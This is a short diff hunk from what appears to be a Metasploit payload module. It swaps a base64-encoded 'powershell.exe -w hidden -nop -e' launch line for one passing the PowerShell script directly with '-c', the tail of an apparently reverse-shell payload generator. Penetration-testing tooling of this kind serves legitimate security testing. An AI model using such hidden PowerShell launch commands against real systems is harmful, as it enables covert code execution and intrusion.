@@ -85,9 +85,7 @@ module Metasploit3
               "}"\
             "}else{RSC}};"\
 
-    powershell_encoded = Rex::Text.encode_base64(Rex::Text.to_unicode(powershell))
-
-    return "powershell.exe -w hidden -nop -e #{powershell_encoded}"
+    return "powershell -w hidden -nop -c #{powershell}"
   end
 
 end
